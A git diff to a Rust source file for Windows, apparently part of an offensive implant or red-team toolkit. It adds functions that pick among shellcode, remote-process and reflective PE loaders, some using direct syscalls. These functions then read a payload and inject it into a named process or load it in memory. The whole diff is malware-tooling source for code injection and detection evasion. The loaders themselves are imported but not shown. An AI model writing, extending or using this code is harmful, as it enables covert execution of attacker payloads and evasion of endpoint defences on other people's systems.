@@ -1,6 +1,9 @@
 #![cfg(target_family = "windows")]
 
+use std::error::Error;
 use std::ffi::c_void;
+use std::fs::File;
+use std::io::Read;
 
 use winapi::shared::ntdef::NULL;
 use windows_sys::Win32::System::{
@@ -9,6 +12,11 @@ use windows_sys::Win32::System::{
 };
 
 use syscalls::syscall;
+
+use crate::loader::{reflective_loader, remote_loader, shellcode_loader};
+use crate::loader_syscalls::{
+    reflective_loader_syscalls, remote_loader_syscalls, shellcode_loader_syscalls,
+};
 
 pub fn fill_structure_from_array<T, U>(base: &mut T, arr: &[U], syscalls_value: bool) -> usize {
     unsafe {
@@ -167,4 +175,73 @@ pub fn string_from_array(array: &mut Vec<u8>) -> String {
     }
 
     return res;
+}
+
+pub fn call_loader_shellcode(
+    shellcode_to_load: Vec<u8>,
+    pe_to_exec: &str,
+    loader: u8,
+) -> Result<(), Box<dyn Error>> {
+    match loader {
+        0 => match shellcode_loader_syscalls(shellcode_to_load, pe_to_exec) {
+            Ok(rl) => rl,
+            Err(_) => {
+                return Err("Shellcode loading error".into());
+            }
+        },
+        1 => match shellcode_loader(shellcode_to_load, pe_to_exec) {
+            Ok(rl) => rl,
+            Err(_) => {
+                return Err("Shellcode loading error".into());
+            }
+        },
+        _ => log::debug!("Invalid loader ID"),
+    }
+    Ok(())
+}
+
+pub fn call_loader_pe(
+    file_to_load: &str,
+    pe_to_exec: &str,
+    loader: u8,
+) -> Result<(), Box<dyn Error>> {
+    let mut buf: Vec<u8> = Vec::new();
+    let file = File::open(file_to_load.trim().replace("\\\\", "\\"));
+    match file {
+        Ok(mut f) => {
+            f.read_to_end(&mut buf)?;
+            match loader {
+                0 => match remote_loader(buf, pe_to_exec) {
+                    Ok(rl) => rl,
+                    Err(_) => {
+                        return Err("PE loading error".into());
+                    }
+                },
+                1 => match remote_loader_syscalls(buf, pe_to_exec) {
+                    Ok(rl) => rl,
+                    Err(_) => {
+                        return Err("PE loading error".into());
+                    }
+                },
+                2 => match reflective_loader(buf) {
+                    Ok(rl) => rl,
+                    Err(_) => {
+                        return Err("PE loading error".into());
+                    }
+                },
+                3 => match reflective_loader_syscalls(buf) {
+                    Ok(rl) => rl,
+                    Err(_) => {
+                        return Err("PE loading error".into());
+                    }
+                },
+                _ => log::debug!("Invalid loader ID"),
+            }
+        }
+        Err(_) => {
+            return Err("Error openning file to load".into());
+        }
+    };
+
+    Ok(())
 }
